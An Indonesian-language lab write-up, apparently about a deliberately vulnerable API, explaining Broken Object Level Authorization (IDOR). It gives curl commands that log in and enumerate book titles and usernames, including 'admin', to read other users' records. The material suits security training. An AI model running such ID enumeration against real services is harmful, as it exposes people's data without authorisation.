# Broken Object Level Authorization
Penyerang dapat mengeksploitasi endpoint API yang rentan terhadap Broken Object Level Authorization (BOLA) / IDOR (Insecure Direct Object Reference) dengan memanipulasi ID objek yang dikirimkan dalam request. ID Objek dapat berupa apa saja, mulai dari bilangan bulat berurutan, UUID, atau string. Akses tidak sah terhadap objek pengguna lain dapat mengakibatkan pengungkapan data kepada pihak yang tidak berwenang, kehilangan data, atau manipulasi data. Celah keamanan ini ditemukan pada endpoint `/books/v1/{book_title}` dan `/users/v1/{username}`

- Login terlebih dahulu untuk mengakses endpoint `/books/v1/{book_title}`
```sh
curl http://IP_Server:5000/users/v1/login -d '{"username":"test","password":"test"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

```sh
curl http://IP_Server:5000/books/v1/bookTitle36 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```


```sh
curl http://IP_Server:5000/books/v1/bookTitle37 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```

```sh
curl http://IP_Server:5000/users/v1/name1 --proxy http://127.0.0.1:8080
```

```sh
curl http://IP_Server:5000/users/v1/name2 --proxy http://127.0.0.1:8080
```


```sh
curl http://IP_Server:5000/users/v1/admin --proxy http://127.0.0.1:8080
```

- Pada endpoint `/books/v1/{book_title}` kita mengakses data dengan menebak urutan parameter **book_title** seperti `bookTitle36` dan `bookTitle36`. Begitu juga dengan endpoint `/users/v1/{username}` kita juga bisa mengakses data user dengan menebak urutan **username** seperti `name1` dan `name2`. Selain itu kita juga bisa menemukan data dengan username `admin`